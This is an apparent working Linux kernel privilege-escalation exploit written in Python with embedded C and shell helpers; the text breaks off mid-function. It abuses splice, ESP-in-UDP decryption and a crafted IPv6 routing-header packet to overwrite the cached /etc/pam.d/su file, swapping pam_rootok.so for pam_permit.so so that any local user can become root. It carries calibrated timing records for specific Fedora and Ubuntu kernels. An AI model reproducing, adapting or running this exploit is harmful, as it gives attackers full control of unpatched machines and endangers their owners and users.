#!/usr/bin/env python3
from __future__ import annotations

import ipaddress
import json
import os
import shlex
import shutil
import struct
import subprocess
import sys
import tempfile
from dataclasses import dataclass
from pathlib import Path


KERNEL_RECORDS_JSON = '[{"distro_id":"fedora","distro_version_id":"43","release":"7.1.3-100.fc43.x86_64","version":"#1 SMP PREEMPT_DYNAMIC Sat Jul  4 19:24:39 UTC 2026","machine":"x86_64","target_file":"/etc/pam.d/su","target_offset":27,"default_block_hex":"70616d5f726f6f746f6b2e736f0a2320","desired_block_hex":"70616d5f7065726d69742e736f200011","attempts":12,"prefix_len":3608,"send_count":8,"guard_before":504,"hold_usec":3000000,"trigger_start_usec":0,"queue_gate":"sender-ready","segments_left":26,"payload_len":1800,"pad_ext":16,"netem_ms":1000,"queue_limit":640,"affinity_cpu":0,"target_src":"fd00:1::1","target_dst":"fd00:1::2","mal_src":"1000:200::","mal_dst":"0:800::"},{"distro_id":"ubuntu","distro_version_id":"24.04","release":"6.8.0-134-generic","version":"#134-Ubuntu SMP PREEMPT_DYNAMIC Fri Jun 26 18:43:11 UTC 2026","machine":"x86_64","target_file":"/etc/pam.d/su","target_offset":146,"default_block_hex":"70616d5f726f6f746f6b2e736f0a0a23","desired_block_hex":"70616d5f7065726d69742e736f200011","attempts":20,"prefix_len":3608,"send_count":512,"guard_before":0,"hold_usec":3000000,"trigger_start_usec":250000,"queue_gate":"sleep","segments_left":26,"payload_len":1800,"pad_ext":16,"netem_ms":500,"queue_limit":640,"affinity_cpu":0,"target_src":"fd00:1::1","target_dst":"fd00:1::2","mal_src":"1000:200::","mal_dst":"0:800::"}]'
SPI = 0xDEADBE10
SEQ = 200
ENC_KEY = bytes([0xBB]) * 16
NEXTHDR_UDP = 17


@dataclass(frozen=True)
class KernelRecord:
    distro_id: str
    distro_version_id: str
    release: str
    version: str
    machine: str
    target_file: str
    target_offset: int
    default_block_hex: str
    desired_block_hex: str
    attempts: int
    prefix_len: int
    send_count: int
    guard_before: int
    hold_usec: int
    trigger_start_usec: int
    queue_gate: str
    segments_left: int
    payload_len: int
    pad_ext: int
    netem_ms: int
    queue_limit: int
    affinity_cpu: int
    target_src: str
    target_dst: str
    mal_src: str
    mal_dst: str

    @property
    def target_path(self: "KernelRecord") -> Path:
        return Path(self.target_file)


AH6_SENDER_C = r"""
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <linux/in6.h>
#include <netinet/icmp6.h>
#include <netinet/ip6.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

static void put_addr(uint8_t *dst, uint8_t tag)
{
	for (size_t i = 0; i < 16; i++)
		dst[i] = (uint8_t)(tag + i);
}

static unsigned long arg_ul(int argc, char **argv, int idx, unsigned long def)
{
	char *end = NULL;
	unsigned long v;

	if (argc <= idx)
		return def;
	errno = 0;
	v = strtoul(argv[idx], &end, 0);
	if (errno || !end || *end)
		return def;
	return v;
}

int main(int argc, char **argv)
{
	unsigned long segments_left = arg_ul(argc, argv, 1, 255);
	unsigned long payload_len = arg_ul(argc, argv, 2, sizeof(struct icmp6_hdr));
	unsigned long pad_ext_len = arg_ul(argc, argv, 3, 0);
	const char *src_addr = argc > 4 ? argv[4] : "2001:db8::1";
	const char *dst_addr = argc > 5 ? argv[5] : "2001:db8::2";
	size_t rthdr_off;
	size_t payload_off;
	size_t packet_len;
	struct sockaddr_in6 sin6;
	struct ip6_hdr *ip6;
	uint8_t *packet;
	uint8_t *rh;
	int fd;
	int one = 1;
	ssize_t ret;

	if (segments_left > 255)
		segments_left = 255;
	if (payload_len < sizeof(struct icmp6_hdr))
		payload_len = sizeof(struct icmp6_hdr);
	if (payload_len > 8192)
		payload_len = 8192;
	if (pad_ext_len > 1024)
		pad_ext_len = 1024;
	pad_ext_len = (pad_ext_len + 7) & ~7UL;
	if (pad_ext_len && pad_ext_len < 8)
		pad_ext_len = 8;

	rthdr_off = 40 + pad_ext_len;
	payload_off = rthdr_off + 8 + 16;
	packet_len = payload_off + payload_len;
	packet = calloc(1, packet_len);
	if (!packet) {
		perror("calloc");
		return 1;
	}

	ip6 = (struct ip6_hdr *)packet;
	rh = packet + rthdr_off;
	ip6->ip6_flow = htonl(6U << 28);
	ip6->ip6_plen = htons((uint16_t)(packet_len - 40));
	ip6->ip6_nxt = pad_ext_len ? IPPROTO_DSTOPTS : IPPROTO_ROUTING;
	ip6->ip6_hlim = 64;
	if (inet_pton(AF_INET6, src_addr, &ip6->ip6_src) != 1 ||
	    inet_pton(AF_INET6, dst_addr, &ip6->ip6_dst) != 1) {
		perror("inet_pton");
		free(packet);
		return 1;
	}

	if (pad_ext_len) {
		uint8_t *dest = packet + 40;

		dest[0] = IPPROTO_ROUTING;
		dest[1] = (uint8_t)((pad_ext_len / 8) - 1);
		memset(dest + 2, 0, pad_ext_len - 2);
	}

	rh[0] = IPPROTO_ICMPV6;
	rh[1] = 2;
	rh[2] = 0;
	rh[3] = (uint8_t)segments_left;
	put_addr(rh + 8, 0x40);

	memset(packet + payload_off, 0x5a, payload_len);
	((struct icmp6_hdr *)(packet + payload_off))->icmp6_type = ICMP6_ECHO_REQUEST;
	((struct icmp6_hdr *)(packet + payload_off))->icmp6_id = htons(0x4848);
	((struct icmp6_hdr *)(packet + payload_off))->icmp6_seq = htons(1);

	fd = socket(AF_INET6, SOCK_RAW | SOCK_CLOEXEC, IPPROTO_RAW);
	if (fd < 0) {
		perror("socket");
		free(packet);
		return 1;
	}
	if (setsockopt(fd, IPPROTO_IPV6, IPV6_HDRINCL, &one, sizeof(one)) < 0) {
		perror("setsockopt IPV6_HDRINCL");
		close(fd);
		free(packet);
		return 1;
	}

	memset(&sin6, 0, sizeof(sin6));
	sin6.sin6_family = AF_INET6;
	sin6.sin6_port = htons(IPPROTO_ICMPV6);
	if (inet_pton(AF_INET6, dst_addr, &sin6.sin6_addr) != 1) {
		perror("inet_pton dst");
		close(fd);
		free(packet);
		return 1;
	}

	ret = sendto(fd, packet, packet_len, 0,
		     (struct sockaddr *)&sin6, sizeof(sin6));
	if (ret < 0) {
		fprintf(stderr, "sendto failed: %s\n", strerror(errno));
		close(fd);
		free(packet);
		return 1;
	}

	printf("sent 1 x %zd-byte IPv6 packet src=%s dst=%s rh_off=%zu payload=%lu pad_ext=%lu segments_left=%lu\n",
	       ret, src_addr, dst_addr, rthdr_off, payload_len,
	       pad_ext_len, segments_left);
	close(fd);
	free(packet);
	return 0;
}
"""


ESP_SPLICE_SENDER_C = r"""
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#ifndef UDP_CORK
#define UDP_CORK 1
#endif
#ifndef UDP_NO_CHECK6_TX
#define UDP_NO_CHECK6_TX 101
#endif
#ifndef SOL_UDP
#define SOL_UDP 17
#endif

#define ENC_PORT 4500

static void die(const char *what)
{
	fprintf(stderr, "%s: %s\n", what, strerror(errno));
	exit(1);
}

static unsigned char *read_file(const char *path, size_t *lenp)
{
	int fd = open(path, O_RDONLY);
	unsigned char *buf = NULL;
	size_t cap = 4096;
	size_t len = 0;

	if (fd < 0)
		die("open read_file");
	buf = malloc(cap);
	if (!buf)
		die("malloc");
	for (;;) {
		ssize_t ret;

		if (len == cap) {
			unsigned char *nbuf;

			cap *= 2;
			nbuf = realloc(buf, cap);
			if (!nbuf)
				die("realloc");
			buf = nbuf;
		}
		ret = read(fd, buf + len, cap - len);
		if (ret < 0)
			die("read");
		if (ret == 0)
			break;
		len += (size_t)ret;
	}
	close(fd);
	*lenp = len;
	return buf;
}

static void send_one(
	int sk,
	const char *path,
	off_t target_off,
	const unsigned char *prefix,
	size_t prefix_len)
{
	int file_fd = -1;
	int pfd[2] = { -1, -1 };
	int cork = 1;
	int uncork = 0;
	off_t off = target_off;
	ssize_t ret;

	if (setsockopt(sk, IPPROTO_UDP, UDP_CORK, &cork, sizeof(cork)) < 0)
		die("setsockopt UDP_CORK on");
	ret = send(sk, prefix, prefix_len, MSG_MORE);
	if (ret != (ssize_t)prefix_len)
		die("send prefix");
	file_fd = open(path, O_RDONLY);
	if (file_fd < 0)
		die("open target");
	if (pipe(pfd) < 0)
		die("pipe");
	ret = splice(file_fd, &off, pfd[1], NULL, 16, SPLICE_F_MOVE);
	if (ret != 16)
		die("splice target");
	ret = splice(pfd[0], NULL, sk, NULL, 16, SPLICE_F_MOVE);
	if (ret != 16)
		die("splice sock");
	close(file_fd);
	close(pfd[0]);
	close(pfd[1]);
	if (setsockopt(sk, IPPROTO_UDP, UDP_CORK, &uncork, sizeof(uncork)) < 0)
		die("setsockopt UDP_CORK off");
}

int main(int argc, char **argv)
{
	const char *target_path = argc > 1 ? argv[1] : "/etc/pam.d/su";
	const char *dst = argc > 2 ? argv[2] : "fd00:1::2";
	const char *prefix_path = argc > 3 ? argv[3] : "/tmp/f001_patch_prefix.bin";
	off_t target_off = argc > 4 ? (off_t)strtoull(argv[4], NULL, 0) : 0;
	unsigned int send_count = argc > 5 ? (unsigned int)strtoul(argv[5], NULL, 0) : 1;
	unsigned int hold_usec = argc > 6 ? (unsigned int)strtoul(argv[6], NULL, 0) : 1000000;
	const char *guard_path = argc > 7 ? argv[7] : target_path;
	unsigned int guard_before = argc > 8 ? (unsigned int)strtoul(argv[8], NULL, 0) : 0;
	unsigned char *prefix;
	size_t prefix_len;
	struct sockaddr_in6 sa;
	int sk;
	int one = 1;
	unsigned int i;

	if (send_count == 0)
		send_count = 1;
	if (send_count > 4096)
		send_count = 4096;
	if (guard_before > 4096)
		guard_before = 4096;

	prefix = read_file(prefix_path, &prefix_len);
	if (prefix_len == 0)
		die("empty packet component");

	sk = socket(AF_INET6, SOCK_DGRAM, 0);
	if (sk < 0)
		die("socket");
	if (setsockopt(sk, IPPROTO_UDP, UDP_NO_CHECK6_TX, &one, sizeof(one)) < 0)
		die("setsockopt UDP_NO_CHECK6_TX");
	memset(&sa, 0, sizeof(sa));
	sa.sin6_family = AF_INET6;
	sa.sin6_port = htons(ENC_PORT);
	if (inet_pton(AF_INET6, dst, &sa.sin6_addr) != 1)
		die("inet_pton dst");
	if (connect(sk, (struct sockaddr *)&sa, sizeof(sa)) < 0)
		die("connect");

	for (i = 0; i < guard_before; i++)
		send_one(sk, guard_path, target_off, prefix, prefix_len);
	for (i = 0; i < send_count; i++)
		send_one(sk, target_path, target_off, prefix, prefix_len);

	printf("patch-splice-sent targets=%u guard_before=%u prefix_len=%zu target_off=%lld\n",
	       send_count, guard_before, prefix_len, (long long)target_off);
	fflush(stdout);
	usleep(hold_usec);
	free(prefix);
	close(sk);
	return 0;
}
"""


ESP_RECEIVER_C = r"""
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/xfrm.h>
#include <netinet/in.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#ifndef UDP_ENCAP
#define UDP_ENCAP 100
#endif
#ifndef UDP_ENCAP_ESPINUDP
#define UDP_ENCAP_ESPINUDP 2
#endif
#ifndef SOL_UDP
#define SOL_UDP 17
#endif
#ifndef UDP_NO_CHECK6_RX
#define UDP_NO_CHECK6_RX 102
#endif

#define ENC_PORT 4500

static void die(const char *what)
{
	fprintf(stderr, "%s: %s\n", what, strerror(errno));
	exit(1);
}

static void put_attr(struct nlmsghdr *nlh, int type, const void *data, size_t len)
{
	struct rtattr *rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));

	rta->rta_type = type;
	rta->rta_len = RTA_LENGTH(len);
	memcpy(RTA_DATA(rta), data, len);
	nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(rta->rta_len);
}

static int add_xfrm_sa(const char *src, const char *dst, uint32_t spi)
{
	int sk = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
	struct sockaddr_nl nl;
	char buf[4096];
	struct nlmsghdr *nlh;
	struct xfrm_usersa_info *xs;
	char rbuf[4096];
	ssize_t n;

	if (sk < 0)
		return -1;
	memset(&nl, 0, sizeof(nl));
	nl.nl_family = AF_NETLINK;
	if (bind(sk, (struct sockaddr *)&nl, sizeof(nl)) < 0)
		goto fail;

	memset(buf, 0, sizeof(buf));
	nlh = (struct nlmsghdr *)buf;
	nlh->nlmsg_type = XFRM_MSG_NEWSA;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	nlh->nlmsg_pid = (uint32_t)getpid();
	nlh->nlmsg_seq = 1;
	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(*xs));
	xs = (struct xfrm_usersa_info *)NLMSG_DATA(nlh);
	if (inet_pton(AF_INET6, dst, &xs->id.daddr.a6) != 1 ||
	    inet_pton(AF_INET6, src, &xs->saddr.a6) != 1 ||
	    inet_pton(AF_INET6, dst, &xs->sel.daddr.a6) != 1 ||
	    inet_pton(AF_INET6, src, &xs->sel.saddr.a6) != 1)
		goto fail;
	xs->family = AF_INET6;
	xs->sel.family = AF_INET6;
	xs->sel.prefixlen_d = 128;
	xs->sel.prefixlen_s = 128;
	xs->id.spi = htonl(spi);
	xs->id.proto = IPPROTO_ESP;
	xs->mode = XFRM_MODE_TRANSPORT;
	xs->replay_window = 0;
	xs->reqid = 0x1234;
	xs->lft.soft_byte_limit = (uint64_t)-1;
	xs->lft.hard_byte_limit = (uint64_t)-1;
	xs->lft.soft_packet_limit = (uint64_t)-1;
	xs->lft.hard_packet_limit = (uint64_t)-1;
	{
		char alg_buf[sizeof(struct xfrm_algo) + 16];
		struct xfrm_algo *ea = (struct xfrm_algo *)alg_buf;

		memset(alg_buf, 0, sizeof(alg_buf));
		strncpy(ea->alg_name, "cbc(aes)", sizeof(ea->alg_name) - 1);
		ea->alg_key_len = 16 * 8;
		memset(ea->alg_key, 0xbb, 16);
		put_attr(nlh, XFRMA_ALG_CRYPT, alg_buf, sizeof(alg_buf));
	}
	{
		struct xfrm_encap_tmpl enc;

		memset(&enc, 0, sizeof(enc));
		enc.encap_type = UDP_ENCAP_ESPINUDP;
		enc.encap_sport = htons(ENC_PORT);
		enc.encap_dport = htons(ENC_PORT);
		put_attr(nlh, XFRMA_ENCAP, &enc, sizeof(enc));
	}

	if (send(sk, nlh, nlh->nlmsg_len, 0) < 0)
		goto fail;
	n = recv(sk, rbuf, sizeof(rbuf), 0);
	if (n < 0)
		goto fail;
	if (((struct nlmsghdr *)rbuf)->nlmsg_type == NLMSG_ERROR) {
		struct nlmsgerr *e = NLMSG_DATA((struct nlmsghdr *)rbuf);

		if (e->error) {
			errno = -e->error;
			goto fail;
		}
	}
	close(sk);
	return 0;

fail:
	close(sk);
	return -1;
}

static int bind_udp6(const char *addr, int port)
{
	int sk;
	int one = 1;
	struct sockaddr_in6 sa;
	int enc = UDP_ENCAP_ESPINUDP;

	sk = socket(AF_INET6, SOCK_DGRAM, 0);
	if (sk < 0)
		die("socket");
	setsockopt(sk, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
	if (setsockopt(sk, IPPROTO_UDP, UDP_NO_CHECK6_RX, &one, sizeof(one)) < 0)
		die("setsockopt UDP_NO_CHECK6_RX");
	memset(&sa, 0, sizeof(sa));
	sa.sin6_family = AF_INET6;
	sa.sin6_port = htons(port);
	if (inet_pton(AF_INET6, addr, &sa.sin6_addr) != 1)
		die("inet_pton bind");
	if (bind(sk, (struct sockaddr *)&sa, sizeof(sa)) < 0)
		die("bind");
	if (setsockopt(sk, IPPROTO_UDP, UDP_ENCAP, &enc, sizeof(enc)) < 0)
		die("setsockopt UDP_ENCAP");
	return sk;
}

int main(int argc, char **argv)
{
	const char *src = argc > 1 ? argv[1] : "fd00:1::1";
	const char *dst = argc > 2 ? argv[2] : "fd00:1::2";
	int encap_sk;

	if (add_xfrm_sa(src, dst, 0xdeadbe10) < 0)
		die("add_xfrm_sa");
	encap_sk = bind_udp6(dst, ENC_PORT);
	printf("receiver-ready src=%s dst=%s encap=%d\n", src, dst, encap_sk);
	fflush(stdout);
	for (;;)
		sleep(60);
}
"""


INNER_SCRIPT = r"""
set -euo pipefail
workdir="${F001_WORKDIR}"
target_file="${F001_TARGET_FILE}"
target_off="${F001_TARGET_OFF}"
attempt="${F001_ATTEMPT}"
target_src="${F001_TARGET_SRC}"
target_dst="${F001_TARGET_DST}"
mal_src="${F001_MAL_SRC}"
mal_dst="${F001_MAL_DST}"
netem_ms="${F001_NETEM_MS}"
queue_limit="${F001_QUEUE_LIMIT}"
send_count="${F001_SEND_COUNT}"
guard_before="${F001_GUARD_BEFORE}"
hold_usec="${F001_HOLD_USEC}"
trigger_start_usec="${F001_TRIGGER_START_USEC}"
queue_gate="${F001_QUEUE_GATE}"
segments_left="${F001_SEGMENTS_LEFT}"
payload_len="${F001_PAYLOAD_LEN}"
pad_ext="${F001_PAD_EXT}"

sleep_frac() {
	awk "BEGIN { print ${1} / 1000000 }"
}

wait_for_receiver() {
	for _receiver_iter in $(seq 1 500); do
		if grep -q '^receiver-ready ' /tmp/f001_receiver.out 2>/dev/null && kill -0 "${receiver_proc}" 2>/dev/null; then
			return
		fi
		if ! kill -0 "${receiver_proc}" 2>/dev/null; then
			printf 'receiver exited before becoming ready:\n' >&2
			cat /tmp/f001_receiver.out >&2 || true
			return 1
		fi
		sleep 0.01
	done
	printf 'receiver did not become ready within 5 seconds:\n' >&2
	cat /tmp/f001_receiver.out >&2 || true
	return 1
}

wait_for_queue_gate() {
	if [ "${queue_gate}" = "sleep" ]; then
		sleep "$(sleep_frac "${trigger_start_usec}")"
		if ! kill -0 "${target_pid}" 2>/dev/null; then
			printf 'queue gate failed attempt %s: target sender exited during calibrated sleep\n' "${attempt}" >&2
			cat /tmp/f001_target.out >&2 || true
			return 1
		fi
		return
	fi
	if [ "${queue_gate}" = "sender-ready" ]; then
		for _gate_iter in $(seq 1 10000); do
			if grep -q '^patch-splice-sent ' /tmp/f001_target.out 2>/dev/null; then
				if ! kill -0 "${target_pid}" 2>/dev/null; then
					printf 'queue gate failed attempt %s: target sender exited after ready line\n' "${attempt}" >&2
					cat /tmp/f001_target.out >&2 || true
					return 1
				fi
				printf 'queue gate ready attempt %s: sender reported queued wall post_gate_usec=%s\n' "${attempt}" "${trigger_start_usec}"
				sleep "$(sleep_frac "${trigger_start_usec}")"
				if ! kill -0 "${target_pid}" 2>/dev/null; then
					printf 'queue gate failed attempt %s: target sender exited before trigger\n' "${attempt}" >&2
					cat /tmp/f001_target.out >&2 || true
					return 1
				fi
				return
			fi
			if ! kill -0 "${target_pid}" 2>/dev/null; then
				printf 'queue gate failed attempt %s: target sender exited before ready line\n' "${attempt}" >&2
				cat /tmp/f001_target.out >&2 || true
				return 1
			fi
			sleep 0.001
		done
		printf 'queue gate failed attempt %s: sender-ready line not observed\n' "${attempt}" >&2
		cat /tmp/f001_target.out >&2 || true
		return 1
	fi
	printf 'queue gate failed attempt %s: unknown queue_gate=%s\n' "${attempt}" "${queue_gate}" >&2
	return 1
}

ip link set lo up
unshare -n sh -c 'exec sleep 1000000' >/dev/null 2>&1 &
recv_pid=$!
cleanup() {
	kill "${recv_pid}" 2>/dev/null || true
	if [ -n "${receiver_proc:-}" ]; then
		kill "${receiver_proc}" 2>/dev/null || true
	fi
	if [ -n "${target_pid:-}" ]; then
		kill "${target_pid}" 2>/dev/null || true
	fi
}
trap cleanup EXIT
sleep 0.2

ip link add tv0 type veth peer name tv1
ip link set tv0 mtu 9000 up
ip link set tv1 netns "${recv_pid}"
ip -6 addr add "${target_src}/64" dev tv0 nodad
nsenter -t "${recv_pid}" -n ip link set lo up
nsenter -t "${recv_pid}" -n ip link set tv1 mtu 9000 up
nsenter -t "${recv_pid}" -n ip -6 addr add "${target_dst}/64" dev tv1 nodad
nsenter -t "${recv_pid}" -n ip -6 route replace local "${target_dst}/128" dev lo table local
peer_mac="$(nsenter -t "${recv_pid}" -n ip -o link show dev tv1 | sed -n 's/.*link\/ether \([0-9a-f:]*\).*/\1/p')"
ip -6 neigh replace "${target_dst}" lladdr "${peer_mac}" dev tv0 nud permanent
ip -6 route replace "${target_dst}/128" encap ioam6 trace prealloc type 0x800000 ns 1 size 24 dev tv0 src "${target_src}"
tc qdisc replace dev tv0 root netem limit "${queue_limit}" delay "${netem_ms}ms"

key_mal="0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
ip link add mv0 type veth peer name mv1
ip link set mv0 mtu 9000 up
ip link set mv1 mtu 9000 up
ip -6 addr add "${mal_src}/128" dev mv0 nodad
mal_mac="$(ip -o link show dev mv1 | sed -n 's/.*link\/ether \([0-9a-f:]*\).*/\1/p')"
ip -6 neigh replace "${mal_dst}" lladdr "${mal_mac}" dev mv0 nud permanent
ip -6 route add "${mal_dst}/128" dev mv0 src "${mal_src}"
ip xfrm state add src "${mal_src}" dst "${mal_dst}" proto ah spi 0x11111111 reqid 0x1111 mode transport auth-trunc 'hmac(sha256)' "${key_mal}" 96
ip xfrm policy add dir out src "${mal_src}/128" dst "${mal_dst}/128" tmpl src "${mal_src}" dst "${mal_dst}" proto ah reqid 0x1111 mode transport

rm -f /tmp/f001_receiver.out /tmp/f001_target.out /tmp/f001_ah6.out
nsenter -t "${recv_pid}" -n "${workdir}/esp_receiver" "${target_src}" "${target_dst}" >/tmp/f001_receiver.out 2>&1 &
receiver_proc=$!
wait_for_receiver
printf 'receiver output attempt %s:\n' "${attempt}"
cat /tmp/f001_receiver.out || true

printf 'pam block before attempt %s: ' "${attempt}"
dd if="${target_file}" bs=1 skip="${target_off}" count=16 status=none | od -An -tx1 | tr -d ' \n'
printf '\n'

printf 'target wall attempt %s: guard_before=%s targets=%s behind %sms netem gate queue_gate=%s\n' "${attempt}" "${guard_before}" "${send_count}" "${netem_ms}" "${queue_gate}"
"${workdir}/esp_splice_sender" "${target_file}" "${target_dst}" "${workdir}/prefix.bin" "${target_off}" "${send_count}" "${hold_usec}" "${workdir}/guard.bin" "${guard_before}" >/tmp/f001_target.out 2>&1 &
target_pid=$!
wait_for_queue_gate
"${workdir}/ah6_sender" "${segments_left}" "${payload_len}" "${pad_ext}" "${mal_src}" "${mal_dst}" >/tmp/f001_ah6.out 2>&1 || true
wait "${target_pid}" || true
sleep 0.2

printf 'pam block after attempt %s: ' "${attempt}"
dd if="${target_file}" bs=1 skip="${target_off}" count=16 status=none | od -An -tx1 | tr -d ' \n'
printf '\n'
printf 'target output attempt %s:\n' "${attempt}"
cat /tmp/f001_target.out || true
printf 'ah6 output attempt %s:\n' "${attempt}"
cat /tmp/f001_ah6.out || true
"""


def breaker(message: str) -> None:
    print(f"\n***{message}***", flush=True)


def run(
    cmd: list[str],
    *,
    input_text: str | None = None,
    check: bool = True,
    timeout: int | None = None,
) -> subprocess.CompletedProcess[str]:
    proc = subprocess.run(
        cmd,
        input=input_text,
        text=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        timeout=timeout,
        check=False,
    )
    if proc.stdout:
        print(proc.stdout, end="", flush=True)
    if check and proc.returncode != 0:
        raise RuntimeError(f"command failed with {proc.returncode}: {' '.join(cmd)}")
    return proc


def require_command(name: str) -> None:
    if shutil.which(name) is None:
        raise RuntimeError(f"required command not found: {name}")


def json_int(obj: dict[str, object], field: str) -> int:
    value = obj.get(field)
    if not isinstance(value, int) or isinstance(value, bool):
        raise RuntimeError(f"{field} must be an integer in embedded kernel records")
    return value


def json_str(obj: dict[str, object], field: str) -> str:
    value = obj.get(field)
    if not isinstance(value, str):
        raise RuntimeError(f"{field} must be a string in embedded kernel records")
    return value


def parse_kernel_record(value: object) -> KernelRecord:
    if not isinstance(value, dict):
        raise RuntimeError("embedded kernel record entries must be objects")
    obj: dict[str, object] = value
    queue_gate = json_str(obj, "queue_gate")
    if queue_gate not in {"sleep", "sender-ready"}:
        raise RuntimeError(f"unsupported queue_gate in embedded kernel records: {queue_gate}")
    return KernelRecord(
        distro_id=json_str(obj, "distro_id"),
        distro_version_id=json_str(obj, "distro_version_id"),
        release=json_str(obj, "release"),
        version=json_str(obj, "version"),
        machine=json_str(obj, "machine"),
        target_file=json_str(obj, "target_file"),
        target_offset=json_int(obj, "target_offset"),
        default_block_hex=json_str(obj, "default_block_hex"),
        desired_block_hex=json_str(obj, "desired_block_hex"),
        attempts=json_int(obj, "attempts"),
        prefix_len=json_int(obj, "prefix_len"),
        send_count=json_int(obj, "send_count"),
        guard_before=json_int(obj, "guard_before"),
        hold_usec=json_int(obj, "hold_usec"),
        trigger_start_usec=json_int(obj, "trigger_start_usec"),
        queue_gate=queue_gate,
        segments_left=json_int(obj, "segments_left"),
        payload_len=json_int(obj, "payload_len"),
        pad_ext=json_int(obj, "pad_ext"),
        netem_ms=json_int(obj, "netem_ms"),
        queue_limit=json_int(obj, "queue_limit"),
        affinity_cpu=json_int(obj, "affinity_cpu"),
        target_src=json_str(obj, "target_src"),
        target_dst=json_str(obj, "target_dst"),
        mal_src=json_str(obj, "mal_src"),
        mal_dst=json_str(obj, "mal_dst"),
    )


def load_kernel_records() -> tuple[KernelRecord, ...]:
    raw: object = json.loads(KERNEL_RECORDS_JSON)
    if not isinstance(raw, list):
        raise RuntimeError("embedded kernel records must be a JSON array")
    return tuple(parse_kernel_record(item) for item in raw)


def read_os_release() -> dict[str, str]:
    for path in (Path("/etc/os-release"), Path("/usr/lib/os-release")):
        try:
            lines = path.read_text(encoding="utf-8").splitlines()
        except FileNotFoundError:
            continue
        except OSError as exc:
            raise RuntimeError(f"could not read {path}: {exc}") from exc
        values: dict[str, str] = {}
        for line in lines:
            key, separator, raw_value = line.partition("=")
            if separator != "=" or key not in {"ID", "VERSION_ID"}:
                continue
            try:
                parsed = shlex.split(raw_value, comments=False, posix=True)
            except ValueError as exc:
                raise RuntimeError(f"could not parse {key} in {path}: {exc}") from exc
            if len(parsed) != 1:
                raise RuntimeError(f"could not parse {key} in {path}")
            values[key] = parsed[0]
        return values
    raise RuntimeError("could not find /etc/os-release or /usr/lib/os-release")


def select_kernel_record() -> KernelRecord:
    uname = os.uname()
    os_release = read_os_release()
    distro_id = os_release.get("ID", "")
    distro_version_id = os_release.get("VERSION_ID", "")
    for record in load_kernel_records():
        if (
            record.distro_id == distro_id
            and record.distro_version_id == distro_version_id
            and record.release == uname.release
            and record.version == uname.version
            and record.machine == uname.machine
        ):
            print(
                "target record: "
                f"distro={record.distro_id} distro_version={record.distro_version_id} "
                f"release={record.release} version={record.version} machine={record.machine}",
                flush=True,
            )
            return record
    raise RuntimeError(
        "target is not covered by embedded records: "
        f"distro={distro_id or '<missing>'} "
        f"distro_version={distro_version_id or '<missing>'} release={uname.release} "
        f"version={uname.version} machine={uname.machine}"
    )


def pin_process_tree(cpu: int) -> None:
    if cpu < 0:
        print("affinity: not pinned by this kernel record", flush=True)
        return
    try:
        allowed = os.sched_getaffinity(0)
    except AttributeError:
        print("affinity: scheduler affinity API unavailable", flush=True)
        return
    except OSError as exc:
        print(f"affinity: could not read allowed CPUs: {exc}", flush=True)
        return
    if not allowed:
        print("affinity: no allowed CPUs reported", flush=True)
        return

    chosen = cpu if cpu in allowed else min(allowed)
    if chosen != cpu:
        print(
            f"affinity: requested CPU {cpu} unavailable; using CPU {chosen}",
            flush=True,
        )
    try:
        os.sched_setaffinity(0, {chosen})
    except OSError as exc:
        print(f"affinity: could not pin to CPU {chosen}: {exc}", flush=True)
        return
    print(f"affinity: pinned process tree to CPU {chosen}", flush=True)


def block_hex(path: Path, offset: int) -> str:
    with path.open("rb") as handle:
        handle.seek(offset)
        return handle.read(16).hex()


def write_helper(workdir: Path, name: str, source: str) -> Path:
    src_path = workdir / f"{name}.c"
    out_path = workdir / name
    src_path.write_text(source, encoding="utf-8")
    run(["gcc", "-O2", "-Wall", "-Wextra", "-o", str(out_path), str(src_path)])
    out_path.chmod(0o755)
    return out_path


def aes_crypt(block: bytes, decrypt: bool) -> bytes:
    if len(block) != 16:
        raise ValueError("AES block must be 16 bytes")
    cmd = ["openssl", "enc", "-aes-128-ecb", "-nopad", "-K", ENC_KEY.hex()]
    if decrypt:
        cmd.append("-d")
    proc = subprocess.run(
        cmd,
        input=block,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        check=True,
    )
    if len(proc.stdout) != 16:
        raise RuntimeError(f"openssl returned {len(proc.stdout)} bytes")
    return proc.stdout


def xor16(left: bytes, right: bytes) -> bytes:
    if len(left) != 16 or len(right) != 16:
        raise ValueError("xor16 needs two 16-byte values")
    return bytes(a ^ b for a, b in zip(left, right))


def ones_complement_sum(data: bytes) -> int:
    if len(data) & 1:
        data += b"\x00"
    acc = 0
    for idx in range(0, len(data), 2):
        acc += (data[idx] << 8) | data[idx + 1]
        acc = (acc & 0xFFFF) + (acc >> 16)
    return acc


def udp6_checksum(src: str, dst: str, udp_payload: bytes) -> int:
    pseudo = (
        ipaddress.IPv6Address(src).packed
        + ipaddress.IPv6Address(dst).packed
        + struct.pack("!I3xB", len(udp_payload), NEXTHDR_UDP)
    )
    acc = ones_complement_sum(pseudo) + ones_complement_sum(udp_payload)
    acc = (acc & 0xFFFF) + (acc >> 16)
    acc = (acc & 0xFFFF) + (acc >> 16)
    csum = (~acc) & 0xFFFF
    return csum or 0xFFFF


def build_esp_prefix(
    src: str,
    dst: str,
    target_path: Path,
    target_offset: int,
    desired_block: bytes,
    prefix_len: int,
) -> bytes:
    if prefix_len < 40 or (prefix_len - 24) % 16 != 0:
